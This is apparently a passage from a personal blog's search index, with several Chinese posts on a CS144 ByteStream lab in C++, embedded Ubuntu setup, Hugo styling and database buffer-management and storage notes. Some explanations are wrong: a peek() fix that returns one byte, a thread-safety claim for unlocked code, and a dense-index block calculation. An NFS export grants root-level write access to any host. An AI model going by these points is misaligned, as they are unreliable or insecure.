{};\nclosed_是一个布尔值，用来标记字节流是否已经被关闭。一旦流被关闭，就不应该再有数据写入。这个状态对于Writer类特别重要，因为它需要知道何时停止接受新的数据。 uint64_t bytes_pushed_ {};\nbytes_pushed_这是一个无符号整数，用于记录已经推送到字节流中的字节数。每次调用 push 方法时，都会更新这个值。 uint64_t bytes_popped_ {};\n这是一个无符号整数，用于记录已经从字节流中弹出的字节数。每次调用 pop 方法时，都会更新这个值。 实现接口 接下来让我们开始一步一步实现接口吧！ 首先是最简单的方法：\n1bool Writer::is_closed() const 2{ 3 return closed_; 4} 这个函数非常简单，它只是返回 closed_ 成员变量的值。closed_ 是一个布尔值，用于标记字节流是否已经关闭。如果 closed_ 为 true，则表示字节流已经关闭，不再允许向其中写入数据。\n接下来是很重要的push函数：\n1void Writer::push(string data) 2{ 3 // 如果流已经关闭，直接返回，不再进行后续操作 4 if (closed_) { 5 return; 6 } 7 8 // 计算要推送的字节数，这个数是输入数据的大小和流的可用容量之间的较小值 9 uint64_t to_push = std::min(data.size(), available_capacity()); 10 // 如果要推送的字节数为0，表示没有可用的容量，因此不推送任何数据，直接返回 11 if (to_push == 0) { 12 return; 13 } 14 15 // 使用循环将要推送的数据添加到流中 16 for (uint64_t i = 0; i \u0026lt; to_push; ++i) { 17 buffer_.push_back(data[i]); // 将数据添加到流的末尾 18 } 19 // 更新已推送的字节数 20 bytes_pushed_ += to_push; 21} 首先，检查 closed_ 是否为 true。如果为 true，则表示字节流已经关闭，不再允许写入数据，因此直接返回。\n然后，计算要推送的字节数to_push。这个数是 data.size()（即输入数据的大小）和 available_capacity()（即字节流的可用容量）之间的较小值。如果to_push为 0，则表示没有可用的容量，因此不推送任何数据，直接返回。\n最后，使用循环将要推送的数据添加到 buffer_ 中。buffer_ 是一个 std::deque\u0026lt;char\u0026gt;，用于存储字节流中的数据。循环的次数是要推送的字节数，每次循环都将一个字节的数据添加到 buffer_ 的末尾。\n又是几个很简单的函数：\n1void Writer::close() 2{ 3 closed_ = true; 4} 这个方法的思路非常简单：就是将 closed_ 设置为 true，以标记字节流已经关闭。\n1bool Reader::is_finished() const 2{ 3 return buffer_.empty()\u0026amp;\u0026amp;closed_; 4} buffer_.empty() 是一个布尔值，表示 buffer_（字节流的缓冲区）是否为空。如果 buffer_ 为空，表示没有更多的数据可以从字节流中读取。\nclosed_ 是一个布尔值，用于标记字节流是否已经关闭。如果 closed_ 为 true，表示字节流已经关闭，不再允许向其中写入数据。\n因此，如果 buffer_ 为空并且 closed_ 为 true，则表示字节流已完成。\n1uint64_t Writer::available_capacity() const 2{ 3 if (buffer_.size() \u0026gt; capacity_) { 4 throw std::runtime_error(\u0026#34;Buffer size exceeds capacity.\u0026#34;); 5 } 6 return capacity_ - buffer_.size(); 7} 这个方法是检查buffer_的可用容量的代码。首先检查 buffer_ 的大小是否超过了 capacity_，如果超过了就抛出错误；没超过就返回字节流的可用容量。\n1uint64_t Writer::bytes_pushed() const 2{ 3 return bytes_pushed_; 4} 5 6 7uint64_t Reader::bytes_popped() const 8{ 9 return bytes_popped_; 10} 这俩方法的思路非常简单：就是返回 bytes_popped_ 和bytes_pushed_ 的值，即已经从字节流中弹出的字节数和已经推送到字节流中的字节数。\n那到底在哪里更新这俩值呢？bytes_pushed_在前面的push函数中被更新；而bytes_popped_顾名思义则在下面的pop函数中更新。\n1void Reader::pop( uint64_t len ) 2{ 3 if (len \u0026gt; buffer_.size()) { 4 throw std::runtime_error(\u0026#34;Cannot pop more data than available in the buffer.\u0026#34;); 5 } 6 len = std::min(len, buffer_.size()); // 确保不会删除超过 buffer_ 大小的元素 7 for (uint64_t i = 0; i \u0026lt; len; ++i) { 8 buffer_.pop_front(); 9 } 10 bytes_popped_ += len; 11} 在这个方法中，首先检查要弹出的数据量 len 是否超过了 buffer_（字节流的缓冲区）的大小。如果超过了，就抛出一个运行时错误。 然后，将 len 设置为 len 和 buffer_.size() 之间的较小值，以确保不会删除超过 buffer_ 大小的元素。 ==你可能会奇怪，前面已经判断过了，len 已经被确认不会大于 buffer_.size()，为什么还要再取值一遍？在这段代码中，因为在多线程环境中，如果在检查 len \u0026gt; buffer_.size() 之后和执行 len = std::min(len, buffer_.size()); 之前，另一个线程修改了 buffer_，那么 len 可能会大于 buffer_.size()。在这种情况下，std::min 调用可以防止尝试弹出超过 buffer_ 大小的元素。== 接着，使用循环从 buffer_ 中弹出 len 个元素。每次循环都调用 buffer_.pop_front()，这个方法会删除 buffer_ 的第一个元素。 最后，更新 bytes_popped_ 的值，将其增加 len。bytes_popped_ 是一个无符号整数，用于记录已经从字节流中弹出的字节数。 然后就是最后一个peek 方法的实现。这个方法的作用是预览字节流中的数据，但不从字节流中删除这些数据。 这个方法真的让我错了很多遍，测试麻了都。一开始的代码是这样的：\n1string_view Reader::peek() const { 2 if (buffer_.empty()) { 3 // 返回一个非空但内容为空的视图 4 return string_view(nullptr, 0); 5 } else { 6 // 只返回缓冲区中实际存在的数据，而不是整个缓冲区的大小 7 return std::string_view(\u0026amp;buffer_.front(), bytes_buffered()); 8 } 9} 后来怎么测试都测试不过，才发现哦，peek 方法的目的是只查看 buffer_ 的第一个元素，而不是所有元素，改了之后终于通过了耶！\n1string_view Reader::peek() const { 2 if (buffer_.empty()) { 3 return string_view(nullptr, 0); // 返回一个空视图 4 } else { 5 // 只返回缓冲区中实际存在的数据，而不是整个缓冲区的大小 6 return std::string_view(\u0026amp;buffer_.front(), 1); 7 } 8} 先来解释一下std::string_view ，它是 C++17 引入的一个新特性，它是一个轻量级的、非拥有的只读字符序列视图。它可以看作是指向字符数组的指针和长度的组合，但并不拥有它所指向的字符数组。std::string_view 的主要用途是作为函数的参数类型，特别是当函数需要接受一个字符串，但不需要拥有它时。使用 std::string_view 可以避免不必要的字符串复制，提高性能。\n在这个方法中，首先，检查 buffer_ 是否为空。这是通过调用 buffer_.empty() 来完成的。如果 buffer_ 为空（即没有数据可以读取），那么方法返回一个空的 std::string_view。这是通过 string_view(nullptr, 0) 实现的，它创建了一个没有数据的 std::string_view。\n如果 buffer_ 不为空，那么方法返回一个 std::string_view，它表示 buffer_ 的第一个元素。这是通过 std::string_view(\u0026amp;buffer_.front(), 1) 实现的。这里，\u0026amp;buffer_.front() 获取 buffer_ 第一个元素的地址，1 表示我们只关心一个元素。\n最后执行cmake --build build --target check0测试 测试结果如下，终于成功了，第一个实验完结撒花🎉！\n1cs144@vm:~/minnow$ cmake --build build --target check0 2Test project /home/cs144/minnow/build 3 Start 1: compile with bug-checkers 4 1/10 Test #1: compile with bug-checkers ........ Passed 0.20 sec 5 Start 2: t_webget 6 2/10 Test #2: t_webget ......................... Passed 1.37 sec 7 Start 3: byte_stream_basics 8 3/10 Test #3: byte_stream_basics ............... Passed 0.04 sec 9 Start 4: byte_stream_capacity 10 4/10 Test #4: byte_stream_capacity ............. Passed 0.02 sec 11 Start 5: byte_stream_one_write 12 5/10 Test #5: byte_stream_one_write ............ Passed 0.02 sec 13 Start 6: byte_stream_two_writes 14 6/10 Test #6: byte_stream_two_writes ........... Passed 0.01 sec 15 Start 7: byte_stream_many_writes 16 7/10 Test #7: byte_stream_many_writes .......... Passed 0.07 sec 17 Start 8: byte_stream_stress_test 18 8/10 Test #8: byte_stream_stress_test .......... Passed 0.25 sec 19 Start 37: compile with optimization 20 9/10 Test #37: compile with optimization ........ Passed 0.07 sec 21 Start 38: byte_stream_speed_test 22 ByteStream throughput: 0.85 Gbit/s 2310/10 Test #38: byte_stream_speed_test ........... Passed 0.16 sec 24 25100% tests passed, 0 tests failed out of 10 26 27Total Test time (real) = 2.21 sec 28Built target check0 ","date":"2024-03-29T14:16:37+08:00","permalink":"https://anonymity-0.github.io/posts/cs144/check0/","title":"Check0"},{"content":"简介 发现自己很久没更新博客了（没错是在摆），课题组要整新的工作，不得不开学嵌入式，话不多说开始！\nMac 主机上一般的日常开发流程为\n在 Mac 上阅读修改代码（VSCode），融合模式下使用 Windows 上 SourceInsight 阅读修改代码，然后通过 共享目录把代码传到 Parallel Desktop 中的 Ubuntu； 在 Ubuntu 上编译程序； 把程序下载到开发板上,运行验证； 在 Mac 下通过串口/网络操作开发板。 ubuntu 安装pd虚拟机 直接官网安装就行\n镜像安装 在这里我选择的是在USTC Open Source Software Mirror下安装的\n下载好之后在pd内进行安装即可\n配置 在Ubuntu上安装图形界面 1sudo apt install ubuntu-desktop 配置中文 这一步看个人选择，如果有需要请gpt/百度\nNFS 服务开启 首先新建文件夹\n1mkdir imx6ull 2cd imx6ull 3mkdir nfs 安装 nfs服务\n1sudo apt-get install nfs-kernel-server rpcbind 使用如下命令打开 nfs配置文件/etc/exports：\n1sudo vi /etc/exports 打开/etc/exports以后在后面添加如下内容：\n1/home/用户名/imx6ull/nfs *rw,sync,no_root_squash 添加完成以后，重启 NFS服务，使用命令如下：\n1sudo /etc/init.d/nfs-kernel-server restart SSH 服务开启 Ubuntu下使用如下命令开启 SSH服务：\n1sudo apt-get install openssh-server 上述命令安装 ssh服务，ssh的配置文件为/etc/ssh/sshd_config，使用默认配置即可\n交叉编译工具 因为我本身下的就是arm架构的镜像，我估计是不需要用交叉编译的，这一步略过（如果之后需要再说）\n下载gcc\n1sudo apt install gcc vscode安装 因为有图形化界面，所以直接浏览器搜索安装就好了，如图 下载好.deb文件后使用如下命令安装（注：注意文件的下载路径）\n1然后使用如下命令安装： 2 3sudo dpkg -i code 1.87.2-1709911730_arm64.deb 安装vscode拓展 这是一些推荐的拓展\nC/C++ C/C++ Snippets 电脑连接板子串行工具安装 CH340 串口驱动安装 终端软件安装 建立 Serial连接，也就是串口连接，因为的主要目的就是作为串口终端使用\n板子之间通信 ","date":"2024-03-29T14:13:47+08:00","permalink":"https://anonymity-0.github.io/posts/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%AD%A6%E4%B9%A0/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/","title":"环境配置"},{"content":"主题优化概述 Hugo是一个优秀的静态网站生成器，通过合理的优化可以获得更好的用户体验。\nCSS优化 1/* 代码块样式优化 */ 2.highlight { 3 border-radius: 12px; 4 padding: 16px 20px; 5 margin: 24px auto; 6 box-shadow: 0 2px 16px rgba(0, 0, 0, 0.08); 7} 8 9/* 行号样式 */ 10.chroma .ln { 11 color: #7f7f7f; 12 margin-right: 0.8em; 13 user-select: none; 14} JavaScript增强 1// 回到顶部功能 2function scrollToTop() { 3 window.scrollTo({ 4 top: 0, 5 behavior: \u0026#39;smooth\u0026#39; 6 }); 7} 8 9// 显示/隐藏回到顶部按钮 10window.addEventListener(\u0026#39;scroll\u0026#39;, function() { 11 const backToTopBtn = document.getElementById(\u0026#39;back-to-top\u0026#39;); 12 if (window.pageYOffset \u0026gt; 300) { 13 backToTopBtn.style.display = \u0026#39;block\u0026#39;; 14 } else { 15 backToTopBtn.style.display = \u0026#39;none\u0026#39;; 16 } 17}); 总结 通过这些优化措施，网站的用户体验得到了显著提升。\n","date":"2024-01-20T14:30:00+08:00","permalink":"https://anonymity-0.github.io/posts/hugo-theme-optimization/","title":"Hugo主题优化实践"},{"content":"代码块测试 这里是一个Python代码块，测试行号显示：\n1def fibonacci(n): 2 \u0026#34;\u0026#34;\u0026#34;计算斐波那契数列的第n项\u0026#34;\u0026#34;\u0026#34; 3 if n \u0026lt;= 1: 4 return n 5 else: 6 # 递归计算 7 return fibonacci(n-1) + fibonacci(n-2) 8 9# 测试函数 10for i in range(10): 11 print(f\u0026#34;F({i}) = {fibonacci(i)}\u0026#34;) 这里是一个JavaScript代码块：\n1function quickSort(arr) { 2 if (arr.length \u0026lt;= 1) { 3 return arr; 4 } 5 6 const pivot = arr[Math.floor(arr.length / 2)]; 7 const left = []; 8 const right = []; 9 const equal = []; 10 11 for (let element of arr) { 12 if (element \u0026lt; pivot) { 13 left.push(element); 14 } else if (element \u0026gt; pivot) { 15 right.push(element); 16 } else { 17 equal.push(element); 18 } 19 } 20 21 return [...quickSort(left), ...equal, ...quickSort(right)]; 22} 23 24// 测试 25const numbers = [64, 34, 25, 12, 22, 11, 90]; 26console.log(\u0026#34;排序前:\u0026#34;, numbers); 27console.log(\u0026#34;排序后:\u0026#34;, quickSort(numbers)); 行内代码测试 这是一些行内代码：console.log(\u0026quot;Hello World\u0026quot;)，还有 npm install 命令。\n总结 这篇文章用于测试代码块行号显示和相关文章功能。\n","date":"2024-01-15T10:00:00+08:00","permalink":"https://anonymity-0.github.io/posts/test-feature/","title":"功能测试文章"},{"content":"缓冲区结构 frame的参数 Dirty Frame中的块是否已经被修改 Pin-count Frame的块的已经被请求并且还未释放的计数，即当前的用户数 *Others Latch: 是否加锁 当请求块时 当一个程序请求一个不在内存中的数据块时，操作系统需要从磁盘中读取该数据块。 首先，它需要在内存中找到一个帧来存放这个数据块。 如果选中的帧是脏的（即，帧中的数据已被修改但尚未写回磁盘），那么操作系统需要先将这个帧的内容写回磁盘。 然后，操作系统从磁盘中读取请求的数据块，并将其放入选中的帧中。 最后，操作系统会增加该帧的固定计数Pin-count（即，标记该帧正在被使用），并返回该数据块在内存中的地址。这样，程序就可以直接访问内存中的数据，而不需要再次从磁盘中读取。这个过程是操作系统管理内存的重要部分，也是实现虚拟内存的关键。 当释放块时 当程序完成对一个数据块的访问后，它需要取消固定（unpin）包含该数据块的帧，以便操作系统可以在需要时重新使用该帧。 同时，如果程序修改了数据块的内容，它需要设置该帧的脏位（dirty bit）。脏位是用来标记帧中的数据是否已被修改，但尚未写回磁盘。如果脏位被设置，那么在帧被替换之前，操作系统需要先将帧的内容写回磁盘。这样可以确保磁盘中的数据始终是最新的，即使发生了系统崩溃或电源故障。 缓冲区替换策略 当内存中没有空闲的帧来存放新的数据块时，操作系统需要选择一个已经被使用的帧进行替换。选择哪个帧进行替换是由替换策略决定的，常见的替换策略包括最近最少使用（LRU），时钟，先进先出（FIFO），最近最常使用（MRU）等。 只有当帧的固定计数为0时，也就是说，当没有程序正在使用该帧时，该帧才会被考虑作为替换的候选者。 替换策略的选择可以对系统的I/O性能产生重大影响，因为每次替换都可能需要从磁盘中读取数据或将数据写回磁盘。不同的访问模式可能会导致某些替换策略比其他策略表现得更好。 理论最优算法：OPT算法 也称为Belady’s算法\n理论上最佳的页面置换算法。它每次都置换以后永远也用不到的页面，如果没有则淘汰最久以后再用到的页面。\nOPT算法必须预先知道全部的页面访问序列，而这在实际DBMS/OS中是无法实现的，因此仅有理论意义。\n但OPT算法可以在实验中作为算法性能上界加以对比\nLRU LRU (Oracle, Sybase, Informix) 所有frame按照最近一次访问时间排列成一个链表 基于时间局部性(Temporal Locality) 假设：越是最近访问的在未来被访问的概率越高. 总是替换LRU端的frame Pros 适用于满足时间局部性的场景（多次重复请求同一页） 选取frame的时间复杂度是O(1) Cons: 缓存污染(Sequentialflooding)：容易出现被频次少的一次连续大量的请求污染,将之前维护的良好的LRU结构都清洗掉了(最大的问题\u0026mdash;by老师) \u0026ldquo;清洗掉\u0026quot;是指低频请求的数据占据了缓存空间，导致原本频繁访问的数据（即LRU结构中的数据）被挤出缓存。 维护LRU链表代价昂贵：修改链表耗时 如果访问不满足时间局部性，则性能较差 只考虑最近一次访问，不考虑访问频率 LRU-K LRU不考虑frame的访问频率，不合理\nLRU-K：如果某个frame的访问次数达到了K次以上，则应当尽量不置换 - 维护2个LRU链表 - 1个是访问次数小于K次的 - 1个是访问次数K次以上的\n优先按照LRU策略置换小于K次的链表 保证高频访问的页能够尽量在buffer中 实验表明 K并非越大越好，LRU-2 性能较好 缺点：需要额外记录访问次数 2Q 与LRU-2类似，不同之处在于访问1次的队列采用FIFO，而不是LRU 这题按照题意，其实说的是2Q的变体，并不是LRU-K，将2Q左边FIFO换成LRU，中间控制阈值改为K 根本原因就是：K值只增不减 策略1：根据负载，动态调整K 策略2; 引入老化机制，减少右侧队列累计的访问次数 实际上LRU-K，按上述情况并不会退化成LRU，而是会退化成一个优先队列 LRU-K算法会淘汰那个在所有帧中具有最大向后k距离的帧。向后k距离是指当前时间戳与第k次之前访问的时间戳之间的差值。这意味着，如果一个帧在最近k次访问中没有被访问过，那么它的向后k距离就会很大，因此它有可能被LRU-K算法淘汰。 如果一个帧的历史访问次数少于k次，那么它的向后k距离被赋予+∞。这意味着，这个帧在最近k次访问中从未被访问过，因此它的向后k距离被视为无穷大。 当有多个帧的向后k距离都是+∞时，淘汰器会淘汰那个具有最早时间戳的帧。这实际上是FIFO（先进先出）策略的应用。也就是说，当有多个帧都没有在最近k次访问中被访问过时，LRU-K算法会淘汰最早被加载到内存中的帧。 Second-Chance FIFO 所有frame组成FIFO链表，每个frame附加一个bit位，初始为0。当FO页第一次被选中置换时置为1，并移到FI端。只有bit位为1的FO端的页才被选中置换。\n相当于每个frame给了两次置换机会，避免高频访问但最近一轮没有被访问的frame被置换出buffer\n每个frame只需要1个额外bit，空间代价很低\n缺点：置换时需要移动多个元素，理论性能比LRU差\nClock(时钟置换算法) 把Second-Chance FIFO组织成环形 N个frame组成环形，current指针指向当前frame；每个frame有一个referenced位，初始为1； 当需要置换页时按顺序执行下面操作: SSD上的置换算法 闪存：读快写慢，写次数有限 减少缓存置换中对闪存的写是一个重要指标 SSD-aware缓存算法 CFLRU (CASES’06，CASES’21 Testof Time Award) Clean-first LRU-WSR (IEEE Trans CE’08) Clean-first + cold flag 置换：clean\u0026gt;cold dirty\u0026gt;hot dirty AD-LRU (DKE’10) cold LRU list + hot LRU list Dynamically adjust two LRUs Q: 为什么不适用OS缓冲区管理，而需要DBMS？\nDBMS经常能预测访问模式(AccessPattern) 可以使用更专门的缓冲区替换策略 有利于pre-fetch策略的有效使用 DBMS需要强制写回磁盘能力（如WAL），OS的缓冲写回一般通过记录写请求来实现（来自不同应用），实际的磁盘修改推迟，因此不能保证写顺序 缓冲区管理的实现 实验 略\n习题 假 设 我 们 采 ⽤ L R U 作 缓 冲 区 置 换 策 略 ， 当 我 们 向 B u f f e r M a n a g e r 发 出 ⼀ 个 读 页 请 求时 ， 请 讨 论 ⼀ 下 ：\n（ 1 ） 如 果 页 不 在 缓 冲 区 中 ， 我 们 需 要 从 磁 盘 中 读 ⼊ 该 页 。 请 问 如 何 才 能 在 缓 冲 区 不 满 的时 候 快 速 地 返 回 ⼀ 个 f r e e 的 f r a m e ？ 请 给 出 ⾄ 少 两 种 策 略 ， 并 分 析 ⼀ 下 各 ⾃ 的 时 间 复 杂 度 。 a.将所有的空闲的frame id插入到一个链表中，每次从链表头部返回一个空闲frame id，时间复杂度为O(1） b. 使用位图，位图的每一位表示一个frame的空闲/占用情况（例如1表示被占用，0表示空闲），需要寻找一个free的frame时，直接扫描位图，找到位图中为0的位置，进而得出其frame id。时间复杂度为O（n） （2）如何才能快速地判断所请求的页是否在缓冲区中？如果请求的页在缓冲区中，如何快速返回该页对应的frame地址？请给出至少两种策略，并分析一下各自的时间复杂度。 a.将在缓冲区的的页的page id以及所在的frame的id以键值对的形式（page id內key, frame id为value）存储在一个哈希表中。可以在**O(1)**的时间复杂度下判断所请求的页是否在缓冲区中，若在缓冲区中可以找到键值对，进而返回该页对应的frame地址。 b.将在缓冲区的的页的page id以及所在的frame的id以键值对的形式（page idkey,frame id为value）存储在一棵B+-tree中，可以在**O(logn)**的时间复杂度下判断所请求的页是否在缓冲区中，若在缓冲区中可以找到键值对，进而返回该页对应的frame地址 3、我们在讲义上介绍了 SSD感知的 CF-LRU 算法，即 Clean-First LRU 算法。该算法虽然看起来可以减少对SSD 的写操作，但依然存在一些问题。请分析一下该算法的主要缺点有哪些？给出三点，并简要解释你的理由。\nCF-LRU算法的基本思想是：把LRU链表分为工作区和替换区，工作区负责维护最近访问的数据页，替换区则负责维护替换候选队列，替换时总是优先替换替换区中的干净页，若替换区没有干净页，则选择LRU链表尾部的第一个脏页作为置换页。在CF-LRU算法中替换区的大小是由窗口大小决定的。CF-LRU通过优先替换出替换区的干净页，在一定程度上可以有效地减少对闪存的写和擦除操作，提升了性能，但还存在一些不足 （1）很难确定一个合适窗口大小的值来适应不同类型的负载。 （2）当链表较长时，查找干净页作为置换页的代价会较高。由于算法在选择置换页时需要沿着链表反向查找干净页，当链表较长时查找代价会增加。 （3）没有考虑缓冲区页的访问频率，在进行替换操作时，容易保留较老的脏页，而替换热的干净页，这会导致缓冲区命中率的降低。 假设一个磁盘块可以存储8条记录或64个“键-指针”对，记录数为n，且记录定长。\n密集索引：在密集索引中，数据库中的每个搜索键值都有一个索引记录1。因此，索引的大小将与记录的数量成正比。如果我们有n条记录，那么我们需要n/8个磁盘块来存储索引（因为每个磁盘块可以存储8个索引项）。加上存储数据本身需要的n/8个磁盘块，总共需要n/4个磁盘块。\n稀疏索引：在稀疏索引中，不会为每个搜索键创建索引记录1。通常，稀疏索引为每个磁盘块的第一个记录建立索引1。因此，如果我们有n条记录，那么我们需要n/64个磁盘块来存储索引（因为每个磁盘块可以存储64个索引项）。加上存储数据本身需要的n/8个磁盘块，总共需要n/64 + n/8个磁盘块。\n","date":"2024-01-11T05:27:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/%E7%AC%AC5%E7%AB%A0-buffer-management/","title":"第5章 缓冲区管理"},{"content":"数据元素的表示层次 数据项 字节序列\n表示关系数据库中元组的属性值\n数据项表示的内容\n表示什么? 姓名 年龄 出生日期 照片 \u0026hellip;.. 用什么表示? Bytes 数据项表示方法:SQL数据类型\nInteger (short)\n2 bytes 例如，35 表示为 00000000 00100011 Real，Float\n4 bytes (32 bits) N bits表示小数，M bits表示指数 Char(n) 或 Character(n) 定长字符串\n小于n时使用特殊填充符 例如，若属性类型为Char(5)，则属性值’cat’ 表示为 Varchar(n) 变长字符串\nNULL终止符，例 Varchar(5) 带长度 定长表示，n+1 bytes Varchar(4): Boolean\nTRUE FALSE 枚举类型\n{RED,GREEN,YELLOW} 整数表示 RED ↔ 1，GREEN ↔ 2，YELLOW ↔ 3 若用两个字节的短整型来表示，则可以表示 216 个不同值 Date\n10字符(SQL92):’YYYY-MM-DD’字符串表示 8字符:’YYYYMMDD’ 7字符:’YYYYDDD’, NOT ‘YYMMDD’! Integer，自1900-01-01以来的天数 Time\n8字符(SQL92):’HH:NN:SS’ ——整数秒 Varchar(n):’HH:NN:SS.FF’——带小数秒 Integer，自00:00:00以来的秒数 Bit\n带长度的二进制位串 按字节表示，例如 010111110011 总结\n类型 表示方法 整数和实数 字符串 定长字符 n字符的数组 变长字符 n+1字符 VARCHAR(n) 长度加内容 |空值-终止字符串 日期和时间 某种格式定长字符串｜变长值｜整数 二进制位/位字符串 长度加内容 ｜字节表示 枚举类型 使用整数编码表示一个枚举类型的值 两种不同的数据项表示 定长数据项 变长数据项 带长度 (常用!) Null Terminated 记录的组织 记录\n数据项 [字段，Fields] 的集合 E.g.: Employee record: name field, salary field, date-of-hire field, .. 记录的类型\n固定格式 vs. 可变格式 Fixed Format vs. Variable Format 定长 vs. 变长 Fixed Length vs. Variable Length 固定格式定长记录\n所有记录具有相同的逻辑结构(模式) 记录的模式(Schema) # fields Name of each field Type of each field Order in record Offset of each field in the record 构造 不考虑寻址特点 考虑寻址特点 假设记录和字段的开始地址必须按4的倍数对齐 E.g. 固定格式定长记录\n记录首部\n在记录首部(Head)的描述记录的信息 记录类型(模式信息) 记录长度 时间戳 其它信息 可变格式记录\n每个记录的格式不同 记录的格式存储于记录中 可变格式变长记录表示\n记录都以“KEY+VALUE”方式表示 KEY与VALUE都以字节流(byte string)存储， 如下:typedef struct { void *data; //字节流指针 int size; //字节流长度} DBT; 特点 数据类型没有限制 应用与数据库之间不需转换数据格式 不提供KEY和VALUE的内容和结构信息 应用必须知道所用的VALUE的含义 此类型数据库 BerkeleyDB Memcached Redis LevelDB RocksDB 好处 灵活的记录格式，适合“松散”记录 尽管一个记录可能有大量字段，但某个记录通常只有有限的几个字段 例如，病人的检验结果 适合处理重复字段\n适合记录格式演变\n缺点 标记存储方式空间代价高，KV方式难以支持复杂查询、应用负担重而且事务处理等实现困难 变长记录表示\n首部指针法 定长字段在前，变长字段在后 name、address变长 混合格式:定长记录+变长记录 记录在块中的组织 假设\n块的大小固定 记录组织成单个文件 定长记录的两种块内组织\n记录地址rid通常使用\u0026laquo;font color=\u0026quot;#ff0000\u0026quot;\u0026gt;块号，槽号\u0026gt;表示 变长记录在块内的组织\n记录在块内的分隔\n定长记录:不需分隔 使用特殊标记 通过块内偏移量 跨块 vs. 不跨块\nUnspanned: 记录必须在一个块中存储\nSpanned:记录可跨块存储\n跨块\n比较\nunspanned:实现简单，但空间浪费 spanned:有效利用空间，实现更复杂 But \u0026hellip;\u0026hellip;\nIf record size \u0026gt; block size，MUST be spanned 不同类型的记录聚簇\n一个块中存储不同类型的记录 (对于RDB:多关系上的聚簇) 好处——聚簇 (clustering)\n经常一起访问的记录存储在同一块或连续块中 STUDENT(s#,sname,age) SC(s#,cname,score) Q1: select student.s#,sc.cname from student s,sc where s.s# = sc.s# Q2: select * from student 如果Q1经常被查询，则聚簇非常有效 若Q2经常被查询，则聚簇反而降低了效率 在块中按序存储记录\n另一种聚簇 (对于RDB:单关系上的聚簇)\n将记录按某个字段顺序排列在块中 好处\n加快按排序字段查询记录时的效率 利于归并联接 (will be discussed later) 记录的分裂\n适合于变长记录的混合格式表示 定长部分存储于某个块中 变长部分存储于另一个块中 与spanned存储类似 记录地址\n物理地址 逻辑地址(间接地址) 借助文件系统的逻辑块地址 文件号+逻辑块地址+块内偏移 记录的修改 插入 记录无序\n插入到任意块的空闲空间中 或申请一个新块(当所有块都已满时) 记录变长时，可使用偏移量表 记录有序\n找到记录应该放置的块 如果有空间，放入并调节记录顺序即可，否则有两种方法: 在“邻近块”中找空间 创建溢出块 删除 立即回收空间 例如，加到可用空间列表中 删除记录时处理溢出块 若删除的记录位于溢出块链上，则删除记录后可对整个链进行重新组织以去除溢出块 使用删除标记 若使用偏移表，则可以修改偏移表项指针，将其置空 若使用逻辑-物理地址映射表，则可以将物理地址置空 可以在记录首部预留一开始位:0-未删除，1- 已删除 块在文件中的组织 堆文件 最基本、最简单的文件结构 记录不以任何顺序排序 记录可能存放在物理不邻接的块上\n插入容易，但查找和删除代价高\n链表式堆文件组织 目录式堆文件组织 SQL Server的数据存储结构 SQL Server的数据库文件是多个对象的集合，包括多个表、索引等 页 在SQL Server中，数据存储的基本单位是页 。在 SQL Server 中，页的大小是 8 KB。 扩展盘区 扩展盘区是一种基本单元，可将其中的空间分配给 表和索引。一个扩展盘区是 8 个邻接的页(或 64 KB)。\n为了使空间分配更有效，SQL Server 对只含少量 数据的表不分配完整的扩展盘区。SQL Server 有 两种类型的扩展盘区:\n统一扩展盘区:由单个对象所有，扩展盘区中的所有八页 只能由拥有该盘区的对象使用。 混合扩展盘区:最多可由 8 个对象共享。 通常从混合扩展盘区中向新表或新索引分配页。当 表或索引增长到 8 页时，就变成统一扩展盘区。\nSQL Server文件组织 SQL Server 数据库有三种类型的文件:\n主要数据文件\n主要数据文件是数据库的起点，指向数据库中文件的其它部分。 每个数据库都有一个主要数据文件。主要数据文件的推荐文件扩 展名是 .mdf。 次要数据文件\n次要数据文件包含除主要数据文件外的所有数据文件。有些数据 库可能没有次要数据文件，而有些数据库则有多个次要数据文件 。次要数据文件的推荐文件扩展名是 .ndf。 日志文件\n日志文件包含恢复数据库所需的所有日志信息。每个数据库必须 至少有一个日志文件，但可以不止一个。日志文件的推荐文件扩展名是** .ldf**。 数据文件的页按顺序编号，文件首页的页码 是 0。每个文件都有一个文件 ID 号。在数 据库中唯一标识一页需要同时使用文件 ID 和页码。\n数据文件的起始结构\nPFS页:给对象分配了扩展盘区后，SQL Server 使用页可用空间 (PFS) 页记录扩展盘区的哪些页 已分配或可用，以及有多少可用的剩余空间。每 个 PFS 页包含大约 8,000 页。PFS 对每一页都 有一个1B的位图，该位图记录这一页是空的、1- 50% 已满、51-80% 已满、81-95% 已满还 是 96-100% 已满。 GAM页:全局分配映射表 (GAM) 页记录已分配 的扩展盘区。每个 GAM 包含 64,000 个扩展盘 区，将近 4 GB 的数据。GAM 对所涵盖区间内 的每个扩展盘区都有一位。如果这个位是 1，则 扩展盘区可用;如果这个位是 0，则扩展盘区已 分配 SGAM 页:共享全局分配映射表 (SGAM)页记录特定的扩展盘区，这些盘区当前用作混合扩展盘区而且至少有一个未使用的页。每个 SGAM 包含 64,000 个扩展盘区。SGAM 对所涵盖区间内的 每个扩展盘区都有一位。如果这个位是 1，则该 扩展盘区就用作混合扩展盘区且有可用的页;如 果这个位是 0，则该扩展盘区不用作混合扩展盘 区，或者虽然用作混合扩展盘区但其所有页都正 在使用中。 若要分配统一扩展盘区，SQL Server 在 GAM 中搜索是 1 的 位，然后将它设成 0。 若要查找有可用页的混合扩展盘区，SQL Server 在 SGAM 中 搜索是 1 的位。 若要分配混合扩展盘区，SQL Server 在 GAM 中搜索是 1 的 位，并将它设置为 0，然后将 SGAM 中相应的位也设置为 1。 若要释放扩展盘区，SQL Server 应确保 GAM 位设置为 1 而 且 SGAM 位设置为 0。 表(Table)的组织\n表的组织\n当 需要插入新行而当前页没有可用空间时，SQL Server 使用 IAM 页查找分配给对象的扩展盘区 。对于每个扩展盘区，SQL Server 搜索 PFS 页 以查看是否有一页具有足够的空间容纳这一行。 ","date":"2024-01-10T04:27:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/%E7%AC%AC4%E7%AB%A0-data-representation/","title":"第4章 数据表达"},{"content":"典型磁盘结构 盘片platter, 盘面 surface, 磁头 R/W head, 磁道 track, 柱面 cylinder, 扇区 sector 磁盘块存取时间 